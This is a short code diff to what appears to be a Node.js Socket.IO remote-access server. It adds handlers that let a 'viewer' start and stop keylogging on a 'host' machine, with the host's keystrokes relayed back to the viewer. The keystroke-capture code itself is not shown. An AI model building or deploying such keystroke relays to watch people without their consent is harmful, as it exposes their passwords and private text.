@@ -87,6 +87,26 @@ io.on("connection", (socket) => {
     }
   });
 
+
+  // ── Keylogger (viewer → host: comandos, host → viewer: teclas) ──────────────
+  socket.on("keylog:start", () => {
+    if (socket.id === viewerSocketId && hostSocketId) {
+      io.to(hostSocketId).emit("keylog:start");
+    }
+  });
+
+  socket.on("keylog:stop", () => {
+    if (socket.id === viewerSocketId && hostSocketId) {
+      io.to(hostSocketId).emit("keylog:stop");
+    }
+  });
+
+  socket.on("keylog:key", (data) => {
+    if (socket.id === hostSocketId && viewerSocketId) {
+      io.to(viewerSocketId).emit("keylog:key", data);
+    }
+  });
+
   // ── Disconnect ───────────────────────────────────────────────────────────────
   socket.on("disconnect", () => {
     if (socket.id === hostSocketId) {
